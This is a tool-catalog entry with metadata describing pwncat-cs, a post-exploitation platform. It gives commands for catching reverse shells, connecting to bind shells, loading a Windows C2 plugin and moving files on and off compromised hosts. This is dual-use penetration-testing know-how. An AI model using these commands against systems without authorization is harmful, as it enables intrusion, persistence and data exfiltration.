---
name: "pwncat-cs"
categories:
  - corpus-backdoor
homepage: "https://github.com/calebstewart/pwncat"
origin: "corpus"
github-repo: "calebstewart/pwncat"
packaged-by: []
meta-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
worth: 3.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
---

# pwncat-cs

> Post-exploitation platform that wraps bind/reverse/SSH sessions in a stabilized pty and adds file transfer, enumeration, privesc and persistence modules.

## What it's for

calebstewart's pwncat (PyPI package and command `pwncat-cs`, BlackArch package `pwncat-caleb`) began as a wrapper around basic bind and reverse shells and grew into a post-exploitation platform: when a session arrives it stabilizes it automatically — disables remote history, normalizes the prompt, spawns a pty and syncs TERM/rows/columns — then provides file upload/download, automated enumeration, privilege escalation and persistence through a module system driven by the familiar `run`, `search`, `info` and `use` commands, staging its code from your machine rather than the target. Linux is the primary target platform; Windows is supported (alpha) via a .NET C2 library loaded on connect, while BSD targets mostly break the automated features. Despite the name it is unrelated to Cytopia's netcat alternative [[pwncat]] — the author renamed the package and entrypoint to `pwncat-cs` precisely because of that clash, so any invocation or prompt shown as plain "pwncat" with session `download`/`upload` commands in practice refers to this tool.

## Typical use cases

### Catch and stabilize an incoming reverse shell

```
pwncat-cs -lp 4444
```

Outcome: listens on 4444 (shorthand `bind://0.0.0.0:4444`, `:4444` also valid); when the target's reverse shell connects, pwncat upgrades it to a full pty session and drops you at the `(local) pwncat$` prompt. This is the exact listener pattern seen in practice against container targets.

### Connect to a bind shell

```
pwncat-cs connect://198.51.100.10:4444
```

Outcome: connects to a shell the target is serving and stabilizes it the same way; netcat/ssh-style shorthand (`pwncat-cs 198.51.100.10 4444` or `pwncat-cs 198.51.100.10:4444`) is accepted for the same connection.

### Handle a Windows target

```
pwncat-cs -m windows -lp 4444
```

Outcome: treats the connecting target as Windows (`--platform` defaults to Linux), automatically downloads and loads the .NET C2 plugin — cached under `~/.local/share/pwncat`, pre-stage offline with `--download-plugins` — and stabilizes cmd.exe/powershell.exe sessions.

### Enter the platform over SSH instead of a raw shell

```
pwncat-cs user:password@target.example.com
```

Outcome: opens the same post-exploitation environment over SSH; key auth (`-i id_rsa user@host`) and non-standard ports (`-p 2222 user@host`, `user@host:2222`) work too.

### Move files and leave a session

```
(local) pwncat$ download /etc/os-release
(local) pwncat$ upload ./linpeas.sh
(local) pwncat$ exit
```

Outcome: at the `(local)` prompt, `download` pulls a remote file into your current directory and `upload` pushes a local file to the target — the standard workflow for moving tooling onto a compromised host and exfiltrating files off it; `exit` closes the session (Ctrl-D toggles between the local pwncat prompt and the raw remote shell).
